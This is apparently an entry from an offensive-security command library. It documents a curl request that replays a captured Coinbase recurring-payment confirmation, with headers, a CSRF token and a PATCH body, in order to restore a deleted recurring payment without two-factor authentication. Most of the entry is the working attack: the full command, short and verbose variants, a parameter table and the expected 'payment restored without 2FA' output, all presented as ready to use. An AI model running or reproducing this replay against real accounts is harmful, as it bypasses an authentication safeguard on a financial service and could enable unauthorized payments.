---
id: cmd-coinbase-replay-001
data: >-
  curl -X POST
  'https://beta.coinbase.com/recurring_payments/58087a3d6861ee015644fc48/confirm'
  -H 'Host: beta.coinbase.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac
  OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0' -H 'Accept: */*;q=0.5,
  text/javascript, application/javascript, application/ecmascript,
  application/x-ecmascript' -H 'Accept-Language: en-US,en;q=0.5' -H
  'Accept-Encoding: gzip, deflate, br' -H 'Referer:
  https://beta.coinbase.com/recurring_payments' -H 'X-NewRelic-ID:
  XA4HVVZTGwIAVFVXBAAG' -H 'X-CSRF-Token:
  /hSt/DD82VwI6ks+4P0VTHTDULz5EhHKowGAGfryWcVCZd47s+rQZDCgr70pJK4EeFHkKWRd0SJbVq1K64IZLA=='
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H
  'X-Requested-With: XMLHttpRequest' -H 'Cookie: [long cookie string including
  session and tracking cookies]' -d 'utf8=%E2%9C%93&_method=patch'
tags:
  - replay
  - http
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:31.042Z'
verified: false
validated: true
submitted: true
---
# replay-coinbase-payment-confirmation

## Command

```bash
curl -X POST 'https://beta.coinbase.com/recurring_payments/58087a3d6861ee015644fc48/confirm' \
  -H 'Host: beta.coinbase.com' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0' \
  -H 'Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Referer: https://beta.coinbase.com/recurring_payments' \
  -H 'X-NewRelic-ID: XA4HVVZTGwIAVFVXBAAG' \
  -H 'X-CSRF-Token: /hSt/DD82VwI6ks+4P0VTHTDULz5EhHKowGAGfryWcVCZd47s+rQZDCgr70pJK4EeFHkKWRd0SJbVq1K64IZLA==' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: [long cookie string including session and tracking cookies]' \
  --data 'utf8=%E2%9C%93&_method=patch'
```

## Description

This curl command replays a captured HTTP POST request to Coinbase's confirmation endpoint, simulating a PATCH to restore a deleted recurring payment without 2FA. Use after capturing the original request during confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| URL path `/recurring_payments/{id}/confirm` | Endpoint with payment ID (replace {id}) | Yes |
| `-H 'X-CSRF-Token: ...'` | Anti-CSRF token from original request | Yes |
| `-H 'Cookie: ...'` | Session and tracking cookies | Yes |
| `--data 'utf8=%E2%9C%93&_method=patch'` | Body parameters for UTF-8 and patch simulation | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://beta.coinbase.com/recurring_payments/58087a3d6861ee015644fc48/confirm' -H 'Cookie: session=abc123' -H 'X-CSRF-Token: token123' --data 'utf8=%E2%9C%93&_method=patch'
```

### Advanced Usage

Include full headers as captured for authenticity:

```bash
curl -X POST 'https://beta.coinbase.com/recurring_payments/58087a3d6861ee015644fc48/confirm' [full headers] --data 'utf8=%E2%9C%93&_method=patch' -v
```

## Expected Output

HTTP 200 OK response with JSON indicating successful update (e.g., {"status": "confirmed"}); payment restored in UI without 2FA prompt.

## Related

- [[procedures/Replay-Coinbase-Payment-Confirmation-Request]]
